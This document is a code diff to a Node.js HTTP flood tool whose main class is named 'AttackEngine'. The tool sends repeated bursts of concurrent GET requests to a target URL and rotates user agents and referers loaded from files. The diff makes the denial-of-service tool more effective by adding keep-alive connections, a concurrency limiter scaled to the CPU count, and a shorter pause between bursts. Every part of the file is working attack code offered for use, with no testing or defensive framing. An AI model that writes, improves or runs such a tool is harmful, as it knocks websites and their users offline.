@@ -1,12 +1,16 @@
 const axios = require('axios');
 const fs = require('fs');
 const os = require('os');
+const http = require('http');
+const https = require('https');
 const process = require('process');
 const cliProgress = require('cli-progress');
+const pLimit = require('p-limit');
 
-const MAX_CONCURRENT = 1000;
+const MAX_CONCURRENT = Math.min(os.cpus().length * 50, 500); // Dynamically scale
 const REQUEST_TIMEOUT = 10000;
 
+// Load list from file
 function loadLines(filename) {
     try {
         return fs.readFileSync(filename, 'utf8')
@@ -21,6 +25,10 @@ function loadLines(filename) {
 const REFERERS = loadLines('refs.txt');
 const USER_AGENTS = loadLines('uas.txt');
 
+// Keep-Alive Agents
+const keepAliveHttp = new http.Agent({ keepAlive: true });
+const keepAliveHttps = new https.Agent({ keepAlive: true });
+
 class AttackEngine {
     constructor(target, duration) {
         this.target = target;
@@ -32,6 +40,7 @@ class AttackEngine {
             errors: 0,
             peakRps: 0
         };
+        this.limit = pLimit(MAX_CONCURRENT);
     }
 
     async makeRequest() {
@@ -46,9 +55,12 @@ class AttackEngine {
         };
 
         try {
+            const isHttps = this.target.startsWith('https');
             const response = await axios.get(this.target, {
                 headers,
-                timeout: REQUEST_TIMEOUT
+                timeout: REQUEST_TIMEOUT,
+                httpAgent: keepAliveHttp,
+                httpsAgent: keepAliveHttps
             });
             return response.status === 200 ? 'SUCCESS' : 'ERROR';
         } catch {
@@ -68,8 +80,12 @@ class AttackEngine {
         }, 1000);
 
         while (Date.now() - this.startTime < this.duration) {
-            const requests = Array.from({ length: MAX_CONCURRENT }, () => this.makeRequest());
-            const results = await Promise.allSettled(requests);
+            const promises = Array.from({ length: MAX_CONCURRENT }, () =>
+                this.limit(() => this.makeRequest())
+            );
+
+            const results = await Promise.allSettled(promises);
+
             results.forEach(res => {
                 this.stats.total++;
                 if (res.status === 'fulfilled' && res.value === 'SUCCESS') {
@@ -78,7 +94,8 @@ class AttackEngine {
                     this.stats.errors++;
                 }
             });
-            await new Promise(r => setTimeout(r, 500));
+
+            await new Promise(r => setTimeout(r, 200)); // Small throttle
         }
 
         clearInterval(interval);
